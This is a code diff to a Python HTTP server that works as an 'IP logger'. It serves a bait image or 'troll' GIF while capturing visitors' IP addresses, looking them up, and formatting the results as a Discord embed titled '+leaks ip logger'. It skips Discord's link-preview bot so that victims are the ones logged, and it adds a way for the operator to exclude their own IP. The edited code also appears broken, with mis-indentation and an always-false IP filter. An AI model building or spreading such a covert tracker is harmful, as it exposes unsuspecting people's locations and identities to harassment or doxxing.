@@ -24,7 +24,6 @@ toggle_log = data["save_txt"]
 
 blacklisted_agents = ["Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"]
 
-# modify if you have knowledge of python
 class IPHandler(http.server.BaseHTTPRequestHandler):
     def _set_headers(self, content_type='text/html'):
         self.send_response(200)
@@ -34,24 +33,22 @@ class IPHandler(http.server.BaseHTTPRequestHandler):
     def serve_image(self, path):
         with open(path, 'rb') as file:
             self.send_response(200)
-            self.send_header('Content-type', 'image/jpg')
+            self.send_header('Content-type', 'image/jpeg')
             self.end_headers()
             self.wfile.write(file.read())
 
-    def serve_gif(self, gif_path):
-        with open(gif_path, 'rb') as file:
+    def serve_gif(self, path):
+        with open(path, 'rb') as file:
             self.send_response(200)
             self.send_header('Content-type', 'image/gif')
             self.end_headers()
             self.wfile.write(file.read())
 
     def do_GET(self):
-        parse_result = urllib.parse.urlparse(self.path)
-        
-        if parse_result.path == '/image.jpg' and troll:
-            self.serve_gif(gif)
-        else:
-            self.serve_image(image)
+            if '.gif' in self.path or 'text/html' in str(self.headers.get('Accept')).lower() and troll:
+                self.serve_gif(os.path.join(os.getcwd(), gif))
+            else:
+                self.serve_image(os.path.join(os.getcwd(), image))
 
             try:
                 if 'X-Forwarded-For' in self.headers:
@@ -140,7 +137,8 @@ class IPHandler(http.server.BaseHTTPRequestHandler):
                     url = f"https://whatismyipaddress.com/ip/{ip}"
                     color = 0xFFB6C1
         
-                if user_agent not in blacklisted_agents and org != "AS396982 Google LLC":
+                # enter in ip.startswith('') your first 3 ip addresses numbers so it wont log you. example: ip.startswith('34.4')
+                if user_agent not in blacklisted_agents and org != "AS396982 Google LLC" and not ip.startswith(''):
                     embed = {
                         "title": "**+leaks ip logger**",
                         "color": color,
